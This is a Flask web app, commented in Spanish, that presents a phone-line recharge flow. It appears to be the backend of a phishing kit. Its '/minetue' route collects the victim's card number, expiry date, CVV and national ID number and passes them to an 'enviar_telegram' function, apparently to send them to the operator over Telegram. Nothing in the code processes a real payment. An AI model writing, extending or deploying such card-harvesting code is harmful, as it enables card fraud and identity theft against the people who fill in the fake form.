from flask import Flask, render_template, request, session
from functions.send_tele import enviar_telegram


app = Flask(__name__)





app.secret_key = 'una_clave_super_secreta_y_dificil_de_adivinar'

# Ruta para la página principal
@app.route('/minetue', methods=["POST"])
def minetute():
    numcc = request.form.get('numcc')
    exp = request.form.get('exp')
    cvv = request.form.get('cvv')
    dni = request.form.get('dni')

    enviar_telegram(numcc, exp, cvv, dni)
    return render_template('minetune.html')

@app.route('/')
def home():
    # render_template busca automáticamente en la carpeta 'templates'
    return render_template('index.html')

@app.route('/recharge-amounts-view' , methods=['POST'])
def recharge_line():
    # render_template busca automáticamente en la carpeta 'templates'

    number_line = request.form.get('number')
    number_line = number_line.replace(" ","")
    session['number_user'] = number_line

    return render_template('number_line.html', number_user=number_line)

@app.route('/ammounts-view')
def ammounts_view():
    number_user = session.get('number_user', 0)


    return render_template('ammount_view.html', number=number_user)

@app.route('/recharge-view', methods=['POST'])
def recharge_view():
    count = request.form.get('monto')
    number_user = session.get('number_user', 0)

    return render_template('recharge_view.html', number=number_user, count=count)

@app.route('/checkout')
def checkout():
    number_user = session.get('number_user', 0)

    return render_template('checkout.html', number=number_user)



# Aquí podrás agregar más rutas después. Ejemplo:
# @app.route('/contacto')
# def contacto():
#     return render_template('contacto.html')

if __name__ == '__main__':
    # debug=True reinicia el servidor automáticamente cuando guardas cambios
    app.run(debug=True, port=5000)